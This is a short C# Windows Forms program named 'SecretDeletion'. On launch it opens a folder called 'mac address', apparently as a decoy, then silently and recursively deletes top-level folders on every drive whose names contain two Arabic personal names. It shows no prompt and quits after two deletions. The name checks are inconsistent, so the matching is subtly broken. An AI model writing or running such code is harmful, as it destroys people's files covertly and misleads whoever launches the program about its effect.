using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace SecretDeletion
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
            Int32 i = 0;
            System.Diagnostics.Process.Start(FOLDER_TO_OPEN);
            foreach (System.IO.DriveInfo driver in System.IO.DriveInfo.GetDrives())
                if (driver.IsReady)
                    foreach (String folder in System.IO.Directory.GetDirectories(driver.Name))
                        if (folder.IndexOf(NAME1) >= 0 || folder.IndexOf(NAME2) > 0)
                        {
                            System.IO.Directory.Delete(folder, true);

                            i++;

                            if (i >= 2)
                                this.Close();
                        }

        }

        private const String NAME1 = "معمر";
        private const String NAME2 = "مياس";
        private const String FOLDER_TO_OPEN = "mac address";
    }
}
